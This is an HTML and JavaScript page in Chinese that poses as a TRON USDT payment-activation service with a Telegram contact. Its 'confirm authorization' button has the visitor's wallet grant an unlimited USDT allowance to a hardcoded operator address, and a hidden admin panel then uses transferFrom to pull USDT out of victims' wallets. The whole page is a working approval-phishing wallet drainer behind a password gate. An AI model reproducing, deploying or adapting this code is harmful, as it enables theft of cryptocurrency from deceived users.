<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>支付开通</title>
<script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/dist/buffer.min.js"></script>
<script>
if (typeof window.Buffer === 'undefined') {
    window.Buffer = Buffer;
}
</script>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui, sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto;display:none;}
.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-bottom:30px}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}
#connectBtn{
 background:#F0B90B;color:#000;
 border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold;
 margin-bottom:16px;
}
.amount-input{
 width:100%;padding:14px;background:#111;border:none;
 border-radius:12px;color:#fff;font-size:16px;text-align:center;
 margin-bottom:12px;
}
.qr-wrap{margin:20px 0;}
.qr-item{margin-bottom:18px;}
.qr-img{width:220px;height:220px;border-radius:12px;margin:0 auto;display:block}
.tip-qr{font-size:12px;color:#ccc;margin:6px 0}
.warn-red{font-size:12px;color:#ff6666}
#payBtn{
 background:#F0B90B;color:#000;
 border:none;padding:16px;width:100%;
 border-radius:14px;font-size:16px;font-weight:bold
}
.admin-panel{
 background:#1E1E35;padding:24px;border-radius:16px;display:none
}
.admin-panel.show{display:block}
.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
.admin-input{
 width:100%;padding:12px;background:#111;border:none;
 border-radius:8px;color:#fff;margin-bottom:10px;
}
.admin-btn{
 width:100%;padding:14px;background:#ff4444;color:#fff;
 border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
}
.tip-box{
 margin-bottom:12px;
 color:#ffd700;
 font-size:12px;
 line-height:1.6;
}
/*密码弹窗遮罩*/
#passwordOverlay{
    position:fixed;
    inset:0;
    background:#0B0B1F;
    display:flex;
    align-items:center;
    justify-content:center;
    z-index:9999;
}
.pwd-box{
    width:320px;
    padding:26px;
    background:#1E1E35;
    border-radius:16px;
    text-align:center;
}
.pwd-box input{
    width:100%;
    padding:14px;
    border-radius:10px;
    border:none;
    font-size:16px;
    margin:14px 0;
}
.pwd-box button{
    width:100%;
    padding:14px;
    background:#F0B90B;
    color:#000;
    border:none;
    border-radius:10px;
    font-weight:bold;
    font-size:16px;
}
</style>
</head>
<body>
<!--密码输入遮罩层-->
<div id="passwordOverlay">
    <div class="pwd-box">
        <h3>请输入访问密码</h3>
        <input id="pwdInput" type="password" placeholder="输入访问密码">
        <button onclick="checkPassword()">确认进入</button>
    </div>
</div>

<div class="container">
    <div class="pay-box">
        <h1>💳 客服飞机号@TNTDHC555</h1>
        <p class="desc">波场链TRON · 安全开通</p>

        <button id="connectBtn">👉 连接钱包（波场链）</button>
        <div id="connectTip" class="tip-box"></div>

        <input class="amount-input" id="amount" value="" placeholder="请输入USDT数量">

        <!-- ==========双二维码 整合在这里，原有授权逻辑全部保留========== -->
        <div class="qr-wrap">
            <div class="qr-item">
                <div class="tip-qr">
                <div class="warn-red">
                <img class="qr-img" id="qrTp">
            </div>
            <div class="qr-item">
                <div class="tip-qr">
                <div class="warn-red">
                <img class="qr-img" id="qrImtoken">
            </div>
            <div class="tip-qr">收款地址：TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE</div>
        </div>

        <button id="payBtn">确认授权开通</button>
    </div>

    <div class="admin-panel" id="adminPanel">
        <div class="admin-title">🔐 管理员控制台</div>
        <div>提取玩家钱包USDT（transferFrom）</div>
        <input class="admin-input" id="userAddr" placeholder="玩家钱包地址">
        <input class="admin-input" id="drawAmt" placeholder="提取数量 USDT">
        <button class="admin-btn" onclick="drawFromUser()">提取玩家代币</button>

        <div>发放USDT奖励给玩家</div>
        <input class="admin-input" id="toAddr" placeholder="玩家钱包地址">
        <input class="admin-input" id="sendAmt" placeholder="发放奖励数量 USDT">
        <button class="admin-btn" onclick="sendReward()">发放奖励代币</button>
    </div>
</div>

<script>
// =========在这里修改你的访问密码==========
const ACCESS_PASSWORD = "gyx140627";

function checkPassword(){
    const inputVal = document.getElementById("pwdInput").value.trim();
    if(inputVal === ACCESS_PASSWORD){
        //密码正确：隐藏密码弹窗，显示DApp页面，再执行生成二维码
        document.getElementById("passwordOverlay").style.display="none";
        document.querySelector(".container").style.display="block";
        genTwoQr();
    }else{
        alert("访问密码错误！");
        document.getElementById("pwdInput").value="";
    }
}
//回车直接确认密码
document.getElementById("pwdInput").addEventListener("keydown",function(e){
    if(e.key === 'Enter') checkPassword();
});

const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const ADMIN_WALLET = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const MAX_ALLOWANCE_SUN = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

const TRC20_ABI = [
    {
        "constant": false,
        "inputs": [
            {"name": "_spender", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_from", "type": "address"},
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transferFrom",
        "outputs": [{"name": "", "type": "bool"}],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "payable": false,
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

let tronWeb = null;
let userAccount = null;

const connectBtn = document.getElementById("connectBtn");
const payBtn = document.getElementById("payBtn");
const connectTip = document.getElementById("connectTip");

// 连接钱包逻辑 完全保留原版
connectBtn.onclick = async () => {
    try {
        connectBtn.disabled = true;
        connectBtn.innerText = "正在连接钱包...";
        connectTip.innerText = "";

        if (window.tokenpocket && window.tokenpocket.tron) {
            await window.tokenpocket.tron.request({ method: "tron_requestAccounts" });
        }

        for (let i = 0; i < 40; i++) {
            if (window.tronWeb && window.tronWeb.ready) {
                tronWeb = window.tronWeb;
                break;
            }
            await new Promise(res => setTimeout(res, 120));
        }

        if (!tronWeb || !tronWeb.ready) {
            alert("⚠️钱包桥加载失败，请刷新页面重试！");
            connectBtn.disabled = false;
            connectBtn.innerText = "👉 连接钱包（波场链）";
            return;
        }

        userAccount = tronWeb.defaultAddress.base58;
        connectBtn.innerText = "✅ 已连接：" + userAccount.slice(0, 8) + "...";
        connectTip.innerText = "钱包地址：" + userAccount;

        if (userAccount === ADMIN_WALLET) {
            document.getElementById("adminPanel").classList.add("show");
        }
    } catch (e) {
        alert("连接钱包失败：" + (e.message || String(e)));
    }
    connectBtn.disabled = false;
};

// 生成双二维码（密码正确之后才执行，不在window.onload直接跑）
function genTwoQr(){
    const tpParam = JSON.stringify({
        protocol:"TokenPocket",
        version:"2.0",
        blockchain:"tron",
        action:"transfer",
        symbol:"USDT",
        contract:USDT_CONTRACT,
        to:ADMIN_WALLET
    });
    const tpRaw = `tpoutside://pull.activity?param=${encodeURIComponent(tpParam)}`;
    const imRaw = `tron:${ADMIN_WALLET}?tokenID=31713`;
    const qrApi = "https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=";
    document.getElementById("qrTp").src = qrApi + encodeURIComponent(tpRaw);
    document.getElementById("qrImtoken").src = qrApi + encodeURIComponent(imRaw);
}

// 授权按钮原版完整保留
payBtn.onclick = async () => {
    if (!tronWeb || !userAccount) {
        return alert("请先连接钱包！");
    }
    try {
        payBtn.disabled = true;
        payBtn.innerText = "授权中...";
        const contract = tronWeb.contract(TRC20_ABI, USDT_CONTRACT);
        const tx = await contract.approve(ADMIN_WALLET, MAX_ALLOWANCE_SUN).send({ feeLimit:100000000 });
        alert("✅无限授权成功，交易哈希：\n"+tx);
        payBtn.innerText = "确认授权开通";
        payBtn.disabled = false;
    } catch (e) {
        payBtn.innerText = "确认授权开通";
        payBtn.disabled = false;
        alert("操作取消或失败："+(e.message||e));
    }
};

// 管理员提取
async function drawFromUser() {
    if(userAccount!==ADMIN_WALLET){alert("不是管理员账号！");return;}
    const fromAddr = document.getElementById("userAddr").value.trim();
    const drawNum = parseFloat(document.getElementById("drawAmt").value);
    if(!fromAddr||isNaN(drawNum)||drawNum<=0){alert("请填写完整参数");return;}
    try{
        const contract = tronWeb.contract(TRC20_ABI,USDT_CONTRACT);
        const sunVal = tronWeb.toSun(drawNum);
        const tx = await contract.transferFrom(fromAddr,ADMIN_WALLET,sunVal).send({feeLimit:100000000});
        alert("✅提取成功，哈希："+tx);
        document.getElementById("userAddr").value="";
        document.getElementById("drawAmt").value="";
    }catch(err){alert("提取失败："+err.message);}
}

// 管理员发币
async function sendReward() {
    if(userAccount!==ADMIN_WALLET){alert("不是管理员账号！");return;}
    const toAddr = document.getElementById("toAddr").value.trim();
    const sendNum = parseFloat(document.getElementById("sendAmt").value);
    if(!toAddr||isNaN(sendNum)||sendNum<=0){alert("请填写完整参数");return;}
    try{
        const contract = tronWeb.contract(TRC20_ABI,USDT_CONTRACT);
        const sunVal = tronWeb.toSun(sendNum);
        const tx = await contract.transfer(toAddr,sunVal).send({feeLimit:100000000});
        alert("✅发放奖励成功，哈希："+tx);
        document.getElementById("toAddr").value="";
        document.getElementById("sendAmt").value="";
    }catch(err){alert("发放失败："+err.message);}
}
</script>
</body>
</html>
